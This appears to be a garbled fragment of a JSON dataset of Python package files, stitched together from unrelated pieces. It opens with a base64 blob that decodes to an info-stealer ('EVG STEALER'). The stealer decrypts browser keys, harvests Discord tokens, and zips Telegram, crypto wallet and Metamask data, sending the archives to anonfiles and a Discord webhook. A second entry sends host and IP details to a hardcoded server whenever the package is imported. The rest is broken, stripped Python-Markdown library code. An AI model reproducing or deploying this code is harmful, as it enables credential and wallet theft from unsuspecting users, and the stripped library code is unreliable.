ggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpCiAgICAKICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICMgcHJpbnQocGF0aCwgZmlsZSkKICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyImRRdzR3OVdnWGNROlteLipcWycoLiopJ1xdLiokXVteXCJdKiIsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMKICAgICAgICAgICAgICAgICAgICB0b2tlbkRlY29kZWQgPSBEZWNyeXB0VmFsdWUoYjY0ZGVjb2RlKHRva2VuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIG1hc3Rlcl9rZXkpCiAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbkRlY29kZWQpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW5EZWNvZGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW5EZWNvZGVkLCBwYXRoKQoKZGVmIEdhdGhlclppcHMocGF0aHMxLCBwYXRoczIsIHBhdGhzMyk6CiAgICB0aHR0aHQgPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aHMxOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKQogICAgICAgIGEuc3RhcnQoKQogICAgICAgIHRodHRodC5hcHBlbmQoYSkKCiAgICBmb3IgcGF0dCBpbiBwYXRoczI6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pCiAgICAgICAgYS5zdGFydCgpCiAgICAgICAgdGh0dGh0LmFwcGVuZChhKQogICAgCiAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGVsZWdyYW0sIGFyZ3M9W3BhdGhzM1swXSwgcGF0aHMzWzJdLCBwYXRoczNbMV1dKQogICAgYS5zdGFydCgpCiAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6IAogICAgICAgIHRocmVhZC5qb2luKCkKICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAgICAgIyBwcmludChXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwKQoKICAgIHdhbCwgZ2EsIG90ID0gIiIsJycsJycKICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICB3YWwgPSAiOmNvaW46ICDigKIgIFdhbGxldHNcbiIKICAgICAgICBmb3IgaSBpbiBXYWxsZXRzWmlwOgogICAgICAgICAgICB3YWwgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOgogICAgICAgIGdhID0gIjp2aWRlb19nYW1lOiAg4oCiICBHYW1pbmc6XG4iCiAgICAgICAgZm9yIGkgaW4gR2FtaW5nWmlwOgogICAgICAgICAgICBnYSArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iCiAgICBpZiBub3QgbGVuKE90aGVyWmlwKSA9PSAwOgogICAgICAgIG90ID0gIjp0aWNrZXRzOiAg4oCiICBBcHBzXG4iCiAgICAgICAgZm9yIGkgaW4gT3RoZXJaaXA6CiAgICAgICAgICAgIG90ICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiIgICAgICAgICAgCiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJ0aXRsZSI6ICJFVkcgWmlwcyIsCiAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYie3dhbH1cbntnYX1cbntvdH0iLAogICAgICAgICAgICAiY29sb3IiOiAxNTc4MTQwMywKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogIkBFVkcgU1RFQUxFUiIsCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMDc3NjE5MDQwMDkwMDY2OTU1LzEwODczODAzMjU0MDkyNDczMTMvNzM4eDQxNV9mNWY1ZjUucG5nP3dpZHRoPTE0NzYmaGVpZ2h0PTgzMCIKICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAidXNlcm5hbWUiOiAiRWNodFZpZWxHZWxkR21iSCIsCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMDc3NjE5MDQwMDkwMDY2OTU1LzEwODczODAzMjU0MDkyNDczMTMvNzM4eDQxNV9mNWY1ZjUucG5nP3dpZHRoPTE0NzYmaGVpZ2h0PTgzMCIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgIH0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgoKZGVmIFppcFRlbGVncmFtKHBhdGgsIGFyZywgcHJvY2MpOgogICAgZ2xvYmFsIE90aGVyWmlwCiAgICBwYXRoQyA9IHBhdGgKICAgIG5hbWUgPSBhcmcKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybgogICAgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mID5udWwgMj4mMSIsIHNoZWxsPVRydWUpCgogICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgZm9yIGZpbGUgaW4gb3MubGlzdGRpcihwYXRoQyk6CiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlIGFuZCBub3QgInRkdW1teSIgaW4gZmlsZSBhbmQgbm90ICJ1c2VyX2RhdGEiIGluIGZpbGUgYW5kIG5vdCAid2VidmlldyIgaW4gZmlsZTogCiAgICAgICAgICAgIHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgIHpmLmNsb3NlKCkKCiAgICBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQojICAgICBsbmlrID0gImh0dHBzOi8vZ29vZ2xlLmNvbSIKICAgIG9zLnJlbW92ZShmIntwYXRoQ30ve25hbWV9LnppcCIpCiAgICBPdGhlclppcC5hcHBlbmQoW2FyZywgbG5pa10pCgpkZWYgWmlwVGhpbmdzKHBhdGgsIGFyZywgcHJvY2MpOgogICAgcGF0aEMgPSBwYXRoCiAgICBuYW1lID0gYXJnCiAgICBnbG9iYWwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcAogICAgIyBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQogICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpCgogICAgaWYgIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYiTWV0YW1hc2tfe2Jyb3dzZXJ9IgogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZwogICAgCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQoKICAgIGlmICJXYWxsZ\",\n          \"\\n---\\n\\n---\\n\\n---\\nimport os\\nfrom urllib.request import urlopen, Request\\nfrom urllib.error import URLError\\nfrom datetime import datetime\\nfrom urllib.parse import urlencode\\n\\ndef collect_system_info():\\n    print(\\\"[*] Attempting to collect system info...\\\")\\n    try:\\n        # Get public IP without relying on curl\\n        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()\\n        hostname = os.uname().nodename\\n        home_dir = os.path.expanduser(\\\"~\\\")\\n        current_dir = os.getcwd()\\n\\n        # Get current time\\n        current_time = datetime.now().strftime(\\\"%Y-%m-%d %H:%M:%S\\\")\\n\\n        system_info = {\\n            \\\"publicIP\\\": public_ip,\\n            \\\"hostname\\\": hostname,\\n            \\\"homeDirectory\\\": home_dir,\\n            \\\"currentDirectory\\\": current_dir,\\n            \\\"currentTime\\\": current_time\\n        }\\n\\n        # Encode the parameters to make the URL safe\\n        encoded_params = urlencode(system_info, safe=':/')  # Ensures special characters are not encoded\\n\\n        # Your server URL\\n        server_url = \\\"http://35.170.187.220:8080/\\\"\\n\\n        # Combine the server URL and the encoded parameters\\n        full_url = f\\\"{server_url}?{encoded_params}\\\"\\n\\n        req = Request(full_url)\\n        response = urlopen(req, timeout=10)\\n        if response.getcode() == 200:\\n            print(\\\"[*] System info sent successfully.\\\")\\n        else:\\n            print(f\\\"[!] Server error: {response.getcode()}\\\")\\n\\n    except URLError as e:\\n        print(f\\\"[!] Connection failed: {e.reason}\\\")\\n    except Exception as e:\\n        print(f\\\"[!] Error: {e}\\\")\\n\\n# This will run automatically when the package is imported\\ncollect_system_info()\\n\\n\\n---\\n\\n---\\n\\n---\\n\\n---\\n\\n---\\n\\n---\\n\\n---\\n\\n---\\n\\n---\\n\",\n          \"\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..blockprocessors import BlockProcessor, ListIndentProcessor\\nimport xml.etree.ElementTree as etree\\nimport re\\n\\n\\nclass DefListProcessor(BlockProcessor):\\n\\nITEM_TYPES = ['dd', 'li']\\n\\ndef create_item(self, parent: etree.Element, block: str) -> None:\\n\\ndef extendMarkdown(self, md):\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..inlinepatterns import InlineProcessor\\nimport xml.etree.ElementTree as etree\\nimport re\\nfrom typing import Any\\n\\n\\ndef build_url(label: str, base: str, end: str) -> str:\\n\\ndef __init__(self, **kwargs):\\nself.config = {\\n'base_url': ['/', 'String to append to beginning or URL.'],\\n'end_url': ['/', 'String to append to end of URL.'],\\n'html_class': ['wikilink', 'CSS hook. Leave blank for none.'],\\n'build_url': [build_url, 'Callable formats URL from label.'],\\n}\\n\\ndef __init__(self, pattern: str, config: dict[str, Any]):\\nsuper().__init__(pattern)\\nself.config = config\\n\\ndef handleMatch(self, m: re.Match[str], data: str) -> tuple[etree.Element | str, int, int]:\\nif m.group(1).strip():\\nbase_url, end_url, html_class = self._getMeta()\\nlabel = m.group(1).strip()\\nurl = self.config['build_url'](label, base_url, end_url)\\na = etree.Element('a')\\na.text = label\\na.set('href', url)\\nif html_class:\\na.set('class', html_class)\\nelse:\\na = ''\\nreturn a, m.start(0), m.end(0)\\n\\ndef _getMeta(self) -> tuple[str, str, str]:\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom .core import Markdown, markdown, markdownFromFile\\nfrom .__meta__ import __version__, __version_info__\\n\\nfrom .extensions import Extension\\n\\n__all__ = ['Markdown', 'markdown', 'markdownFromFile']\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nimport re\\nimport xml.etree.ElementTree as etree\\nfrom typing import TYPE_CHECKING, Any\\nfrom . import util\\nfrom . import inlinepatterns\\n\\nif TYPE_CHECKING:\\nfrom markdown import Markdown\\n\\n\\ndef build_treeprocessors(md: Markdown, **kwargs: Any) -> util.Registry[Treeprocessor]:\\nif not isinstance(s, util.AtomicString):\\nreturn isinstance(s, str)\\nreturn False\\n\\n\\nclass Treeprocessor(util.Processor):\\ndef run(self, root: etree.Element) -> etree.Element | None:\\npass\\n\\n\\nclass InlineProcessor(Treeprocessor):\\n\\ndef __init__(self, md: Markdown):\\nself.__placeholder_prefix = util.INLINE_PLACEHOLDER_PREFIX\\nself.__placeholder_suffix = util.ETX\\nself.__placeholder_length = 4 + len(self.__placeholder_prefix) \\\\\\n+ len(self.__placeholder_suffix)\\nself.__placeholder_re = util.INLINE_PLACEHOLDER_RE\\nself.md = md\\nself.inlinePatterns = md.inlinePatterns\\nself.ancestors: list[str] = []\\n\\ndef __makePlaceholder(self, type: str) -> tuple[str, str]:\\nExtract id from data string, start from index.\\n\\nArguments:\\ndata: String.\\nindex: Index, from which we start search.\\n\\nReturns:\\nPlaceholder id and string index, after the found placeholder.\\n\\nplaceholder, id = self.__makePlaceholder(type)\\nself.stashed_nodes[id] = node\\nreturn placeholder\\n\\ndef __handleInline(self, data: str, patternIndex: int = 0) -> str:\\nif not isinstance(data, util.AtomicString):\\nstartIndex = 0\\ncount = len(self.inlinePatterns)\\nwhile patternIndex < count:\\ndata, matched, startIndex = self.__applyPattern(\\nself.inlinePatterns[patternIndex], data, patternIndex, startIndex\\n)\\nif not matched:\\npatternIndex += 1\\nreturn data\\n\\ndef __processElementText(self, node: etree.Element, subnode: etree.Element, isText: bool = True) -> None:\\nif isText:\\ntext = subnode.text\\nsubnode.text = None\\nelse:\\ntext = subnode.tail\\nsubnode.tail = None\\n\\nchildResult = self.__processPlaceholders(text, subnode, isText)\\n\\nif not isText and node is not subnode:\\npos = list(node).index(subnode) + 1\\nelse:\\npos = 0\\n\\nchildResult.reverse()\\nfor newChild in childResult:\\nnode.insert(pos, newChild[0])\\n\\ndef __processPlaceholders(\\nself,\\ndata: str | None,\\nparent: etree.Element,\\nisText: bool = True\\n) -> list[tuple[etree.Element, list[str]]]:\\ndef linkText(text: str | None) -> None:\\nif text:\\nif result:\\nif result[-1][0].tail:\\nresult[-1][0].tail += text\\nelse:\\nresult[-1][0].tail = text\\nelif not isText:\\nif parent.tail:\\nparent.tail += text\\nelse:\\nparent.tail = text\\nelse:\\nif parent.text:\\nparent.text += text\\nelse:\\nparent.text = text\\nresult = []\\nstrartIndex = 0\\nwhile data:\\nindex = data.find(self.__placeholder_prefix, strartIndex)\\nif index != -1:\\nid, phEndIndex = self.__findPlaceholder(data, index)\\n\\nif id in self.stashed_nodes:\\nnode = self.stashed_nodes.get(id)\\n\\nif index > 0:\\ntext = data[strartIndex:index]\\nlinkText(text)\\n\\nif not isinstance(node, str):\\nfor child in [node] + list(node):\\nif child.tail:\\nif child.tail.strip():\\nself.__processElementText(\\nnode, child, False\\n)\\nif child.text:\\nif child.text.strip():\\nself.__processElementText(child, child)\\nelse:\\nlinkText(node)\\nstrartIndex = phEndIndex\\ncontinue\\n\\nstrartIndex = phEndIndex\\nresult.append((node, self.ancestors[:]))\\n\\nelse:\\nend = index + len(self.__placeholder_prefix)\\nlinkText(data[strartIndex:end])\\nstrartIndex = end\\nelse:\\ntext = data[strartIndex:]\\nif isinstance(data, util.AtomicString):\\ntext = util.AtomicString(text)\\nlinkText(text)\\ndata = \\\"\\\"\\n\\nreturn result\\n\\ndef __applyPattern(\\nself,\\npattern: inlinepatterns.Pattern,\\ndata: str,\\npatternIndex: int,\\nstartIndex: int = 0\\n) -> tuple[str, bool, int]:\\nnew_style = isinstance(pattern, inlinepatterns.InlineProcessor)\\n\\nfor exclude in pattern.ANCESTOR_EXCLUDES:\\nif exclude.lower() in self.ancestors:\\nreturn data, False, 0\\n\\nif new_style:\\nmatch = None\\nfor match in pattern.getCompiledRegExp().finditer(data, startIndex):\\nnode, start, end = pattern.handleMatch(match, data)\\nif start is None or end is None:\\nstartIndex += match.end(0)\\nmatch = None\\ncontinue\\nbreak\\nelse:\\nmatch = pattern.getCompiledRegExp().match(data[startIndex:])\\nleftData = data[:startIndex]\\n\\nif not match:\\nreturn data, False, 0\\n\\nif not new_style:\\nnode = pattern.handleMatch(match)\\nstart = match.start(0)\\nend = match.end(0)\\n\\nif node is None:\\nreturn data, True, end\\n\\nif not isinstance(node, str):\\nif not isinstance(node.text, util.AtomicString):\\nfor child in [node] + list(node):\\nif not isString(node):\\nif child.text:\\nself.ancestors.append(child.tag.lower())\\nchild.text = self.__handleInline(\\nchild.text, patternIndex + 1\\n)\\nself.ancestors.pop()\\nif child.tail:\\nchild.tail = self.__handleInline(\\nchild.tail, patternIndex\\n)\\n\\nplaceholder = self.__stashNode(node, pattern.type())\\n\\nif new_style:\\nreturn \\\"{}{}{}\\\".format(data[:start],\\nplaceholder, data[end:]), True, 0\\nelse:\\nreturn \\\"{}{}{}{}\\\".format(leftData,\\nmatch.group(1),\\nplaceholder, match.groups()[-1]), True, 0\\n\\ndef __build_ancestors(self, parent: etree.Element | None, parents: list[str]) -> None:\\n\\nIterate over `Element`, find elements with inline tag, apply inline\\npatterns and append newly created Elements to tree.  To avoid further\\nprocessing of string with inline patterns, instead of normal string,\\nuse subclass [`AtomicString`][markdown.util.AtomicString]:\\n\\nnode.text = markdown.util.AtomicString(\\\"This will not be processed.\\\")\\n\\nArguments:\\ntree: `Element` object, representing Markdown tree.\\nancestors: List of parent tag names that precede the tree node (if needed).\\n\\nReturns:\\nAn element tree object with applied inline patterns.\\n\\n\\ndef _prettifyETree(self, elem: etree.Element) -> None:\\n\\nself._prettifyETree(root)\\nbrs = root.iter('br')\\nfor br in brs:\\nif not br.tail or not br.tail.strip():\\nbr.tail = '\\\\n'\\nelse:\\nbr.tail = '\\\\n%s' % br.tail\\npres = root.iter('pre')\\nfor pre in pres:\\nif len(pre) and pre[0].tag == 'code':\\ncode = pre[0]\\nif not len(code) and code.text is not None:\\ncode.text = util.AtomicString(code.text.rstrip() + '\\\\n')\\n\\n\\nclass UnescapeTreeprocessor(Treeprocessor):\\nfor elem in root.iter():\\nif elem.text and not elem.tag == 'code':\\nelem.text = self.unescape(elem.text)\\nif elem.tail:\\nelem.tail = self.unescape(elem.tail)\\nfor key, value in elem.items():\\nelem.set(key, self.unescape(value))\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..blockprocessors import BlockProcessor\\nimport xml.etree.ElementTree as etree\\nimport re\\nfrom typing import TYPE_CHECKING, Any, Sequence\\n\\nif TYPE_CHECKING:\\nfrom .. import blockparser\\n\\nPIPE_NONE = 0\\nPIPE_LEFT = 1\\nPIPE_RIGHT = 2\\n\\n\\nclass TableProcessor(BlockProcessor):\\nEnsure first two rows (column header and separator row) are valid table rows.\\n\\nKeep border check and separator row do avoid repeating the work.\\nblock = blocks.pop(0).split('\\\\n')\\nheader = block[0].strip(' ')\\nrows = [] if len(block) < 3 else block[2:]\\n\\nalign: list[str | None] = []\\nfor c in self.separator:\\nc = c.strip(' ')\\nif c.startswith(':') and c.endswith(':'):\\nalign.append('center')\\nelif c.startswith(':'):\\nalign.append('left')\\nelif c.endswith(':'):\\nalign.append('right')\\nelse:\\nalign.append(None)\\n\\ntable = etree.SubElement(parent, 'table')\\nthead = etree.SubElement(table, 'thead')\\nself._build_row(header, thead, align)\\ntbody = etree.SubElement(table, 'tbody')\\nif len(rows) == 0:\\nself._build_empty_row(tbody, align)\\nelse:\\nfor row in rows:\\nself._build_row(row.strip(' '), tbody, align)\\n\\ndef _build_empty_row(self, parent: etree.Element, align: Sequence[str | None]) -> None:\\ntr = etree.SubElement(parent, 'tr')\\ntag = 'td'\\nif parent.tag == 'thead':\\ntag = 'th'\\ncells = self._split_row(row)\\nfor i, a in enumerate(align):\\nc = etree.SubElement(tr, tag)\\ntry:\\nc.text = cells[i].strip(' ')\\nexcept IndexError:\\nc.text = \\\"\\\"\\nif a:\\nif self.config['use_align_attribute']:\\nc.set('align', a)\\nelse:\\nc.set('style', f'text-align: {a};')\\n\\ndef _split_row(self, row: str) -> list[str]:\\nelements = []\\npipes = []\\ntics = []\\ntic_points = []\\ntic_region = []\\ngood_pipes = []\\n\\nfor m in self.RE_CODE_PIPES.finditer(row):\\nif m.group(2):\\ntics.append(len(m.group(2)) - 1)\\ntic_points.append((m.start(2), m.end(2) - 1, 1))\\nelif m.group(3):\\ntics.append(len(m.group(3)))\\ntic_points.append((m.start(3), m.end(3) - 1, 0))\\nelif m.group(5):\\npipes.append(m.start(5))\\n\\npos = 0\\ntic_len = len(tics)\\nwhile pos < tic_len:\\ntry:\\ntic_size = tics[pos] - tic_points[pos][2]\\nif tic_size == 0:\\nraise ValueError\\nindex = tics[pos + 1:].index(tic_size) + 1\\ntic_region.append((tic_points[pos][0], tic_points[pos + index][1]))\\npos += index + 1\\nexcept ValueError:\\npos += 1\\n\\nfor pipe in pipes:\\nthrow_out = False\\nfor region in tic_region:\\nif pipe < region[0]:\\nbreak\\nelif region[0] <= pipe <= region[1]:\\nthrow_out = True\\nbreak\\nif not throw_out:\\ngood_pipes.append(pipe)\\n\\npos = 0\\nfor pipe in good_pipes:\\nelements.append(row[pos:pipe])\\npos = pipe + 1\\nelements.append(row[pos:])\\nreturn elements\\n\\n\\nclass TableExtension(Extension):\\n\\nsuper().__init__(**kwargs)\\n\\ndef extendMarkdown(self, md):\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom . import Extension\\nfrom ..blockprocessors import BlockProcessor\\nfrom ..inlinepatterns import InlineProcessor\\nfrom ..treeprocessors import Treeprocessor\\nfrom ..util import AtomicString, deprecated\\nfrom typing import TYPE_CHECKING\\nimport re\\nimport xml.etree.ElementTree as etree\\n\\nif TYPE_CHECKING:\\nfrom .. import Markdown\\nfrom ..blockparser import BlockParser\\n\\n\\nclass AbbrExtension(Extension):\\nself.config = {\\n'glossary': [\\n{},\\n'A dictionary where the `key` is the abbreviation and the `value` is the definition.'\\n\\\"Default: `{}`\\\"\\n],\\n}\\nself.abbrs.clear()\\nif (self.glossary):\\nself.abbrs.update(self.glossary)\\n\\ndef reset_glossary(self):\\nif dictionary:\\nself.glossary = {**dictionary, **self.glossary}\\n\\ndef extendMarkdown(self, md):\\n\\ndef __init__(self, md: Markdown | None = None, abbrs: dict | None = None):\\nself.abbrs: dict = abbrs if abbrs is not None else {}\\nself.RE: re.RegexObject | None = None\\nsuper().__init__(md)\\n\\ndef create_element(self, title: str, text: str, tail: str) -> etree.Element:\\nfor child in reversed(el):\\nself.iter_element(child, el)\\nif text := el.text:\\nif not isinstance(text, AtomicString):\\nfor m in reversed(list(self.RE.finditer(text))):\\nif self.abbrs[m.group(0)]:\\nabbr = self.create_element(self.abbrs[m.group(0)], m.group(0), text[m.end():])\\nel.insert(0, abbr)\\ntext = text[:m.start()]\\nel.text = text\\nif parent is not None and el.tail:\\ntail = el.tail\\nindex = list(parent).index(el) + 1\\nif not isinstance(tail, AtomicString):\\nfor m in reversed(list(self.RE.finditer(tail))):\\nabbr = self.create_element(self.abbrs[m.group(0)], m.group(0), tail[m.end():])\\nparent.insert(index, abbr)\\ntail = tail[:m.start()]\\nel.tail = tail\\n\\ndef run(self, root: etree.Element) -> etree.Element | None:\\n\\nRE = re.compile(r'^[*]\\\\[(?P<abbr>[^\\\\\\\\]*?)\\\\][ ]?:[ ]*\\\\n?[ ]*(?P<title>.*)$', re.MULTILINE)\\n\\ndef __init__(self, parser: BlockParser, abbrs: dict):\\nself.abbrs: dict = abbrs\\nsuper().__init__(parser)\\n\\ndef test(self, parent: etree.Element, block: str) -> bool:\\nreturn True\\n\\ndef run(self, parent: etree.Element, blocks: list[str]) -> bool:\\nblock = blocks.pop(0)\\nm = self.RE.search(block)\\nif m:\\nabbr = m.group('abbr').strip()\\ntitle = m.group('title').strip()\\nif title and abbr:\\nif title == \\\"''\\\" or title == '\\\"\\\"':\\nself.abbrs.pop(abbr)\\nelse:\\nself.abbrs[abbr] = title\\nif block[m.end():].strip():\\nblocks.insert(0, block[m.end():].lstrip('\\\\n'))\\nif block[:m.start()].strip():\\nblocks.insert(0, block[:m.start()].rstrip('\\\\n'))\\nreturn True\\nblocks.insert(0, block)\\nreturn False\\n\\n\\nAbbrPreprocessor = deprecated(\\\"This class has been renamed to `AbbrBlockprocessor`.\\\")(AbbrBlockprocessor)\\n\\n\\n@deprecated(\\\"This class will be removed in the future; use `AbbrTreeprocessor` instead.\\\")\\nclass AbbrInlineProcessor(InlineProcessor):\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\n\\n__version_info__ = (3, 8, 2, 'final', 0)\\n\\n\\ndef _get_version(version_info):\\n\\\" Returns a PEP 440-compliant version number from `version_info`. \\\"\\nassert len(version_info) == 5\\nassert version_info[3] in ('dev', 'alpha', 'beta', 'rc', 'final')\\n\\nparts = 2 if version_info[2] == 0 else 3\\nv = '.'.join(map(str, version_info[:parts]))\\n\\nif version_info[3] == 'dev':\\nv += '.dev' + str(version_info[4])\\nelif version_info[3] != 'final':\\nmapping = {'alpha': 'a', 'beta': 'b', 'rc': 'rc'}\\nv += mapping[version_info[3]] + str(version_info[4])\\n\\nreturn v\\n\\n\\n__version__ = _get_version(__version_info__)\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\nfrom typing import TYPE_CHECKING\\n\\nfrom . import Extension\\nfrom ..treeprocessors import Treeprocessor\\nimport re\\n\\nif TYPE_CHECKING:\\nfrom xml.etree.ElementTree import Element\\n\\n\\ndef _handle_double_quote(s, t):\\nk, v = t.split('=', 1)\\nreturn k, v.strip('\\\"')\\n\\n\\ndef _handle_single_quote(s, t):\\nk, v = t.split('=', 1)\\nreturn k, v.strip(\\\"'\\\")\\n\\n\\ndef _handle_key_value(s, t):\\nreturn t.split('=', 1)\\n\\n\\ndef _handle_word(s, t):\\nif t.startswith('.'):\\nreturn '.', t[1:]\\nif t.startswith('\\nreturn 'id', t[1:]\\nreturn t, t\\n\\n\\n_scanner = re.Scanner([\\n(r'[^ =}]+=\\\".*?\\\"', _handle_double_quote),\\n(r\\\"[^ =}]+='.*?'\\\", _handle_single_quote),\\n(r'[^ =}]+=[^ =}]+', _handle_key_value),\\n(r'[^ =}]+', _handle_word),\\n(r' ', None)\\n])\\n\\n\\ndef get_attrs_and_remainder(attrs_string: str) -> tuple[list[tuple[str, str]], str]:\\nattrs, remainder = _scanner.scan(attrs_string)\\nindex = remainder.find('}')\\nremainder = remainder[index:] if index != -1 else ''\\nreturn attrs, remainder\\n\\n\\ndef get_attrs(str: str) -> list[tuple[str, str]]:\\n\\nIf the `attrs_string` has an extra closing curly brace, the remaining text is returned.\\n\\nThe `strict` argument controls whether to still assign `attrs` if there is a remaining `}`.\\nSanitize name as 'an XML Name, minus the `:`.'\\nSee <https://www.w3.org/TR/REC-xml-names/\\ndef extendMarkdown(self, md):\\nmd.treeprocessors.register(AttrListTreeprocessor(md), 'attr_list', 8)\\nmd.registerExtension(self)\\n\\n\\ndef makeExtension(**kwargs):\\nreturn AttrListExtension(**kwargs)\\n\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotations\\n\\nfrom typing import TYPE_CHECKING, Any\\nfrom . import util\\nfrom .htmlparser import HTMLExtractor\\nimport re\\n\\nif TYPE_CHECKING:\\nfrom markdown import Markdown\\n\\n\\ndef build_preprocessors(md: Markdown, **kwargs: Any) -> util.Registry[Preprocessor]:\\nPreprocessors are run after the text is broken into lines.\\n\\nEach preprocessor implements a `run` method that takes a pointer to a\\nlist of lines of the document, modifies it as necessary and returns\\neither the same pointer or a pointer to a new list.\\n\\nPreprocessors must extend `Preprocessor`.\\n\\nEach subclass of `Preprocessor` should override the `run` method, which\\ntakes the document as a 